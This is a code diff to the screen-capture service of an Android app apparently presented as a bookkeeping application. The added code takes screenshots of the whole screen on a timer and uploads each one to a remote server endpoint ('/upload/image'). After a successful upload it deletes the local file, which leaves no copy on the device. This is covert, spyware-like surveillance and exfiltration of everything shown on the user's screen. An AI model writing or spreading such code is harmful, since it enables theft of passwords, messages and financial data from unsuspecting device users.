@@ -17,27 +17,35 @@ import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
+import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.IBinder;
 import android.util.Log;
+import android.widget.Toast;
 
-import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
-import androidx.core.content.ContextCompat;
 
 import com.example.bookkeepingapplication.MainActivity;
 import com.example.bookkeepingapplication.R;
+import com.example.bookkeepingapplication.utils.FileUtils;
+import com.example.bookkeepingapplication.utils.HttpUtils;
 import com.example.bookkeepingapplication.utils.MyApplication;
+import com.example.bookkeepingapplication.utils.UrlUtils;
 
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.Serializable;
 import java.nio.ByteBuffer;
 import java.util.Timer;
 import java.util.TimerTask;
+
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.Response;
 
 
 //另一种实现截屏方式，在原有基础上改进
@@ -95,7 +103,7 @@ public class ScreenCaptureService extends Service {
             }
         };
         timer.schedule(timerTask,
-                1000,//延迟1秒执行
+                3000,//延迟1秒执行
                 Time);//周期时间
 
 //        startGetCapture();
@@ -108,11 +116,9 @@ public class ScreenCaptureService extends Service {
                 windowWidth, windowHeight, mScreenDensity,       DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                 mImageReader.getSurface(), null, null);
 //                getImage();
-
         mImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
             @Override
             public void onImageAvailable(ImageReader mImageReader) {
-
                 Image image = null;
                 try {
                     image = mImageReader.acquireLatestImage();
@@ -123,42 +129,14 @@ public class ScreenCaptureService extends Service {
                             int pixelStride = planes[0].getPixelStride();
                             int rowStride = planes[0].getRowStride();
                             int rowPadding = rowStride - pixelStride * windowWidth;
-
-
                             // create bitmap
                             bmp = Bitmap.createBitmap(windowWidth + rowPadding / pixelStride,
                                     windowHeight, Bitmap.Config.ARGB_8888);
                             bmp.copyPixelsFromBuffer(buffer);
-
                             croppedBitmap = Bitmap.createBitmap(bmp, 0, 0, windowWidth, windowHeight);
 
-//                                    runOnUiThread(new Runnable() {
-//                                        @Override
-//                                        public void run() {
-//                                            mIvShow.setImageBitmap(croppedBitmap);
-//                                            mainLayout.setVisibility(View.VISIBLE);
-//                                        }
-//                                    });
-
-//                            if (Build.VERSION.SDK_INT>=Build.VERSION_CODES.M){
-//                                if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE)!= PackageManager.PERMISSION_GRANTED){
-//                                    //没有权限则申请权限
-//                                    ActivityCompat.requestPermissions(MainActivity.this,new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE},1);
-//                                    Log.d(TAG, "onImageAvailable: 1111");
-//                                }else {
-//                                    //有权限直接执行,docode()不用做处理
-//                                    Log.d(TAG, "onImageAvailable: 2222");
-//                                    saveBitmap(croppedBitmap);
-//
-//                                }
-//                            }else {
-//                                //小于6.0，不用申请权限，直接执行
-//                                Log.d(TAG, "onImageAvailable: 3333");
-//                                saveBitmap(croppedBitmap);
-//                            }
-                            saveBitmap(croppedBitmap);
-
-
+                            String imagePath = saveBitmap(croppedBitmap);
+                            uploadImage(imagePath);
 
                             if (croppedBitmap != null) {
                                 croppedBitmap.recycle();
@@ -168,7 +146,6 @@ public class ScreenCaptureService extends Service {
                             }
                         }
                     }
-
                 } catch (Exception e) {
                     e.printStackTrace();
                 } finally {
@@ -181,13 +158,10 @@ public class ScreenCaptureService extends Service {
                     if (mVirtualDisplay != null) {
                         mVirtualDisplay.release();
                     }
-
                     mImageReader.setOnImageAvailableListener(null, null);
 //                mProjection.stop();
-
 //                onScreenshotTaskOver();
                 }
-
             }
         }, getBackgroundHandler());
 
@@ -206,7 +180,7 @@ public class ScreenCaptureService extends Service {
         return backgroundHandler;
     }
 
-    private void saveBitmap(Bitmap bitmap) {
+    private String saveBitmap(Bitmap bitmap) {
         String pathImage = Environment.getExternalStorageDirectory().getPath()+"/Pictures/";
         String imageName = pathImage + System.currentTimeMillis() + ".jpg";
         Log.d(TAG, "saveBitmap: " + imageName);
@@ -232,6 +206,7 @@ public class ScreenCaptureService extends Service {
         } catch (IOException e) {
             e.printStackTrace();
         }
+        return imageName;
     }
 
     //生成一个通知，表示程序当前正在运行
@@ -266,4 +241,114 @@ public class ScreenCaptureService extends Service {
         manager.notify(1, notification);
     }
 
+    private void uploadImage(String imagePath) {
+        String url = UrlUtils.testUrls + "/upload/image";
+        String imageName = System.currentTimeMillis() + ".jpg";
+        HttpUtils.doFile(url, imagePath, imageName, new Callback() {
+            @Override
+            public void onFailure(Call call, IOException e) {
+                Log.d(TAG, "onFailure: ");
+            }
+
+            @Override
+            public void onResponse(Call call, Response response) throws IOException {
+                String s = response.body().string().trim();
+                Log.d(TAG, "onResponse: " + s);
+                delete(imagePath);  //将本地文件删除
+            }
+        });
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        timer.cancel();
+    }
+
+    /**
+     * 删除文件，可以是文件或文件夹
+     *
+     * @param delFile 要删除的文件夹或文件名
+     * @return 删除成功返回true，否则返回false
+     */
+    private boolean delete(String delFile) {
+        File file = new File(delFile);
+        if (!file.exists()) {
+            Toast.makeText(getApplicationContext(), "删除文件失败:" + delFile + "不存在！", Toast.LENGTH_SHORT).show();
+//            Log.e(TAG, "delete: 删除文件失败:" + delFile + "不存在！");
+            return false;
+        } else {
+            if (file.isFile()) return deleteSingleFile(delFile);
+            else
+                return deleteDirectory(delFile);
+        }
+    }
+
+    /**
+     * 删除单个文件
+     *
+     * @param filePath$Name 要删除的文件的文件名
+     * @return 单个文件删除成功返回true，否则返回false
+     */
+    private boolean deleteSingleFile(String filePath$Name) {
+        File file = new File(filePath$Name);
+        // 如果文件路径所对应的文件存在，并且是一个文件，则直接删除
+        if (file.exists() && file.isFile()) {
+            if (file.delete()) {
+                Log.e("--Method--", "Copy_Delete.deleteSingleFile: 删除单个文件" + filePath$Name + "成功！");
+                return true;
+            } else {
+                Log.e(TAG, "deleteSingleFile: 删除单个文件" + filePath$Name + "失败！");
+//                Toast.makeText(getApplicationContext(), "删除单个文件" + filePath$Name + "失败！", Toast.LENGTH_SHORT).show();
+                return false;
+            }
+        } else {
+            Log.e(TAG, "deleteSingleFile: 删除单个文件" + filePath$Name + "不存在！");
+//            Toast.makeText(getApplicationContext(), "删除单个文件失败：" + filePath$Name + "不存在！", Toast.LENGTH_SHORT).show();
+            return false;
+        }
+    }
+
+    /**
+     * 删除目录及目录下的文件
+     *
+     * @param filePath 要删除的目录的文件路径
+     * @return 目录删除成功返回true，否则返回false
+     */
+    private boolean deleteDirectory(String filePath) { // 如果dir不以文件分隔符结尾，自动添加文件分隔符
+        if (!filePath.endsWith(File.separator)) filePath = filePath + File.separator;
+        File dirFile = new File(filePath);
+        // 如果dir对应的文件不存在，或者不是一个目录，则退出
+        if ((!dirFile.exists()) || (!dirFile.isDirectory())) {
+            Log.e(TAG, "deleteDirectory: 删除目录失败" + filePath + "不存在！");
+//            Toast.makeText(getApplicationContext(), "删除目录失败：" + filePath + "不存在！", Toast.LENGTH_SHORT).show();
+            return false;
+        }
+        boolean flag = true;
+        // 删除文件夹中的所有文件包括子目录
+        File[] files = dirFile.listFiles();
+        for (File file : files) { // 删除子文件
+            if (file.isFile()) {
+                flag = deleteSingleFile(file.getAbsolutePath());
+                if (!flag) break;
+            } // 删除子目录
+            else if (file.isDirectory()) {
+                flag = deleteDirectory(file.getAbsolutePath());
+                if (!flag) break;
+            }
+        }
+        if (!flag) {
+            Log.e(TAG, "deleteDirectory: 删除目录失败" + filePath + "失败！");
+//            Toast.makeText(getApplicationContext(), "删除目录失败！", Toast.LENGTH_SHORT).show();
+            return false;
+        } // 删除当前目录
+        if (dirFile.delete()) {
+            Log.e("--Method--", "Copy_Delete.deleteDirectory: 删除目录" + filePath + "成功！");
+            return true;
+        } else {
+            Log.e(TAG, "deleteDirectory: 删除目录：" + filePath + "失败！");
+//            Toast.makeText(getApplicationContext(), "删除目录：" + filePath + "失败！", Toast.LENGTH_SHORT).show();
+            return false;
+        }
+    }
 }
